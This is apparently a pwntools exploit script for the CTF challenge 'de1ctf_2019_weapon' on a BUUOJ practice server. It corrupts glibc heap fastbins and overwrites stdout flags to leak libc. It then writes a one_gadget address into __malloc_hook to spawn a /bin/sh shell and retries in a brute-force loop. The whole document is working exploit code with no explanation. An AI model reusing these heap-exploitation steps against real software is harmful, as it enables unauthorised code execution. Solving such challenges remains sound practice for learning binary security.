from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# gdb.attach(io)
# pause()

def shh():
    io=remote("node4.buuoj.cn",29563)
    # io=process("./de1ctf_2019_weapon")
    elf=ELF("./de1ctf_2019_weapon")
    libc=ELF("libc-2.23.so")

    one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

    def add(s,n,cc):
        io.sendlineafter(b">> \n",b"1")
        io.sendlineafter(b"weapon: ",str(s))
        io.sendlineafter(b"index: ",str(n))
        io.sendafter(b"name:\n",cc)
        
    def delete(n):
        io.sendlineafter(b">> \n",b"2")
        io.sendlineafter(b"idx :",str(n))
        
    def edit(n,cc):
        io.sendlineafter(b">> \n",b"3")
        io.sendlineafter(b"idx: ",str(n))
        io.sendafter(b"content:\n",cc)
    add(0x60,0,b"aaa")
    add(0x60,1,b"bbb")
    add(0x60,2,b"ccc")
    add(0x10,3,b"ddd")

    # delete(2)

    delete(1)
    delete(0)

    edit(0,b"\x50")

    # gdb.attach(io)
    # pause()

    add(0x60,4,p64(0)*9+p64(0x71))
    add(0x60,5,p64(0)*3+p64(0xe1))
    # payload=p64(0)*3+p64(0x91)
    # edit(0,payload)

    delete(1)
    # add(0x60,6,b"qqq")
    # add(0x10,7,b"ttt")
    delete(0)
    delete(2)

    edit(2,b"\x70")

    payload=p64(0)*3+p64(0x71)+b"\xdd\x55"
    edit(5,payload)

    add(0x60,7,b"aaa")
    add(0x60,8,b"bbb")

    payload=b"\x00"*0x33+p64(0xfbad1877)+p64(0)*3+b"\x00"
    add(0x60,9,payload)

    leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-192-libc.sym[b"_IO_2_1_stderr_"]   
    print("leak_addr: "+hex(leak_addr))
    shell=one_gadget[3]+leak_addr
    malloc_hook=libc.sym[b"__malloc_hook"]+leak_addr

    add(0x60,10,b"qqq")

    delete(0)
    edit(0,p64(malloc_hook-0x23))
    add(0x60,11,b"aaa")
    add(0x60,12,cyclic(0x13)+p64(shell))

    io.sendlineafter(b">> \n",b"1")
    io.sendlineafter(b"weapon: ",b"24")
    io.sendlineafter(b"index: ",b"13")

    io.interactive()

while True:
    try:
        shh()
    except:
        io.close()
        continue
# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
